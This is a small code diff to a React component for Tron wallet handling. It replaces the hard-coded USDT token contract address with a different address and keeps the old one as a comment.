@@ -9,7 +9,8 @@ function ApprovedDataDetails({ show, title, message, onClose }) {
   const [tron, setTron] = useState(null);
   const [usdtContract, setUsdtContract] = useState(null);
 
-  const usdtTokenAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
+  // const usdtTokenAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
+  const usdtTokenAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs"
   useEffect(() => {
 
     if(show){
